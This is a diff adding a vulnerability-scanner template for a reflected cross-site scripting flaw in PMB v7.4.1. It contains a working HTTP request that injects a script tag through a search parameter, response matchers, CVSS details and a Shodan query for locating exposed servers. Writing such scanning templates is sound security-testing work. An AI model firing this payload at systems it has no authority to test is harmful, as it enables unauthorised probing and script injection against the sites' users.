@@ -1,0 +1,52 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - <script>alert(1337)</script>
+  - condition: or
+    part: body
+    type: word
+    words:
+    - PMB Group
+    - pmbDojo
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /pmb/opac_css/index.php?lvl=search_result&search_type_asked=extended_search
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    add_field=&search%5B%5D=f_1&op_0_f_1=EXACT&field_0_f_1%5B%5D=gang&explicit_search=1&search_xml_file=search_fields&delete_field=&launch_search=1&page=&no_search=0&ij6fm%22%3e%3cscript%3ealert(1337)%3c%2fscript%3evg9q6c4g1mk=1
+
+    '
+id: pmb-xss
+info:
+  author: r3Y3r53
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  description: 'PMB v7.4.1 allow attacker to inject arbitrary malicious HTML or Javascripts
+    code in user web browser via no_search parameter
+
+    '
+  metadata:
+    max-request: 1
+    shodan-query: http.favicon.hash:1469328760
+    verified: true
+  name: PMB v7.4.1 - Cross Site Scripting
+  reference:
+  - https://github.com/jenaye/PMB
+  severity: medium
+  tags: xss,pmb,cms
